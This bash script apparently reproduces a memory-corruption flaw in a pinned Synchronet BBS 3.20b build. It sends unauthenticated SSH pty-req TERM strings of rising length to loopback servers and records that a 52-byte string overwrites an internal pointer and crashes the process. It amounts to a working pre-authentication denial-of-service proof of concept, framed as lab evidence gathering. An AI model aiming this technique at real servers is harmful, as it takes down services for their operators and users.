#!/usr/bin/env bash
# W27: on the real shipped 3.20b build (db9c5d6f), find the first unauthenticated
# wire TERM length that corrupts savedlines.first and kills the process. Four
# fresh loopback servers, one uniform-'A' TERM each: 40 (control), 42 (padding
# byte 41 only), 48 (line_delay at +44, first still nil), 52 (first low four
# bytes). No chosen pointer bytes: a crash here is an unchosen-byte availability
# datum, NOT pointer control. Helpers are copied verbatim from the W26 driver;
# instrumentation-only probe after the verbatim no-size copy statement.
set -euo pipefail
cd "$(dirname "$0")/../../.."
HERE=$PWD
TREE=$HERE/src-tree/320b
P=$HERE/provision
LANE=$HERE/release-label/term320b/termlen320b
E=$LANE/evidence
PARENT=db9c5d6fd37ef74b6e6ca647308d351e656de18d
MIRROR=https://github.com/SynchronetBBS/sbbs.git
DEBS="zip libarchive-dev libnspr4-dev autoconf2.13"
pass=0
fail=0

note() { echo "TERMLEN320B $*"; }
expect() {
    local what=$1 desc=$2
    if eval "$what"; then
        note "PASS $desc"
        pass=$((pass + 1))
    else
        note "FAIL $desc (test: $what)"
        fail=$((fail + 1))
    fi
}

if [ ! -e "$TREE/.git" ]; then
    note "cloning pinned shipped 3.20b parent $PARENT"
    git clone --no-checkout "$MIRROR" "$TREE"
    git -C "$TREE" checkout --detach "$PARENT"
fi
test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || {
    echo "TREE_HEAD_MISMATCH"; exit 2;
}
mkdir -p "$E" "$P/debs" "$P/local" || exit 2
for d in $DEBS; do
    (cd "$P/debs" && test -f "${d}_"*.deb || apt-get download "$d")
done
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
ln -sf /usr/lib/x86_64-linux-gnu/libacl.so.1 "$L/libacl.so"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f "$TREE/src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne" 2>/dev/null || true
    sleep 1
}
cleanup_src() {
    git -C "$TREE" checkout -- src/sbbs3/answer.cpp 2>/dev/null || true
}
stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    cleanup_stale
    SPID=
}
trap 'stop_server; cleanup_src' EXIT
cleanup_src

HN=$(hostname)
INI="$TREE/ctrl/sbbs.$HN.ini"
write_ini() {
    local port=$1
    cat > "$INI" <<EOF
; W26 lab-only loopback SSH config on shipped 3.20b; all other services off.
; SSH_ANYAUTH is required for unauthenticated loopback TERM reach on this build.
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging
[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $port
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS
[Mail]
	AutoStart = false
[FTP]
	AutoStart = false
[Web]
	AutoStart = false
[Services]
	AutoStart = false
[UNIX]
	Daemonize = False
	PidFile = sbbs-w26.pid
	LogFacility = User
	LogIdent = synchronet-w26
	umask = 077
EOF
}
PORT=$((24000 + $$ % 1000))
write_ini "$PORT"

build() {
    cleanup_stale
    make -C "$TREE/3rdp/build" jslib > "$P/jslib-w27.log" 2>&1 || return 1
    make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w27.log" 2>&1 || return 1
}
port_bindable() {
    python3 - "$1" <<'PY'
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(('127.0.0.1', int(sys.argv[1])))
except OSError:
    sys.exit(1)
finally:
    s.close()
PY
}
wait_port_free() {
    for i in $(seq 1 120); do
        if ! ss -ltn 2>/dev/null | grep -q ":$PORT " && port_bindable "$PORT"; then
            return 0
        fi
        cleanup_stale
        sleep 0.5
    done
    echo PORT_BUSY; return 1
}
start_server() {
    local label=$1 log="$E/$2"
    wait_port_free || return 1
    (cd "$TREE" && exec env SBBSCTRL="$TREE/ctrl" \
        ./src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 120); do
        if grep -q '!ERROR 98 binding SSH Server socket' "$log"; then
            echo PORT_BIND_ERROR; return 1
        fi
        grep -q 'Terminal Server thread started for nodes 1 through 4' "$log" && return 0
        sleep 0.5
    done
    echo SERVER_START_TIMEOUT; return 1
}
run_case() {
    local term=$1 out=$2 i
    (for i in $(seq 1 3); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout 10 ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}

git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/release-label/term320b/real320b/probe-320b.patch") || exit 6
build || { echo BUILD_FAILED_VULN; exit 7; }
{
    echo "W27 shipped 3.20b TERM-length threshold; loopback SSH pty-req only"
    sha256sum "$HERE/release-label/term320b/termlen320b/run-termlen320b.sh" "$HERE/release-label/term320b/real320b/probe-320b.patch"
    git -C "$TREE" rev-parse HEAD
} > "$E/provenance.txt"

for n in 40 42 48 52; do
    PORT=$((PORT + 1))
    write_ini "$PORT"
    start_server "$n" "server-$n.log" || { echo "SERVER_START_FAILED_$n"; exit 8; }
    run_case "$(printf 'A%.0s' $(seq 1 "$n"))" "$E/client-$n.log" 8
    sleep 2
    { printf 'PID=%s ' "$SPID"; if [ -r "/proc/$SPID/stat" ]; then
        awk '{print "STATE=" $3}' "/proc/$SPID/stat"; else echo "STATE=gone"; fi
    } > "$E/alive-$n.txt"
    stop_server
done
grep -hF 'REAL_320B_PROBE' "$E"/server-*.log > "$E/probes.txt" || true
cat "$E"/alive-*.txt > "$E/alive.txt"

expect "grep -qF 'REAL_320B_PROBE sizeof=41 l=40 off41=00 cv=00000000 first=(nil) last=(nil)' '$E/server-40.log'" \
    'n=40: zero bytes past terminal[41]'
expect "grep -qF 'REAL_320B_PROBE sizeof=41 l=42 off41=41 cv=00000000 first=(nil) last=(nil)' '$E/server-42.log'" \
    'n=42: one padding byte, no adjacent field'
expect "grep -qF 'REAL_320B_PROBE sizeof=41 l=48 off41=41 cv=41414141 first=(nil) last=(nil)' '$E/server-48.log'" \
    'n=48: line_delay overwritten, savedlines pointers still nil'
expect "grep -qF 'REAL_320B_PROBE sizeof=41 l=52 off41=41 cv=41414141 first=0x41414141 last=(nil)' '$E/server-52.log'" \
    'n=52: first four bytes of savedlines.first overwritten'
for n in 40 42 48; do
    expect "grep -q 'destructor end' '$E/server-$n.log'" \
        "n=$n: teardown completed"
    expect "! grep -qE 'STATE=(gone|Z)' '$E/alive-$n.txt'" \
        "n=$n: process alive after teardown"
done
expect "grep -q 'destructor begin' '$E/server-52.log'" \
    'n=52: session reached teardown'
expect "! grep -q 'destructor end' '$E/server-52.log'" \
    'n=52: no completed teardown (process fault)'
expect "grep -qE 'STATE=(gone|Z)' '$E/alive-52.txt'" \
    'n=52: process dead after the non-chosen 52-byte TERM'

echo "RESULT: PASS=$pass FAIL=$fail"
note "EVIDENCE_DIR=$E"
test "$fail" -eq 0
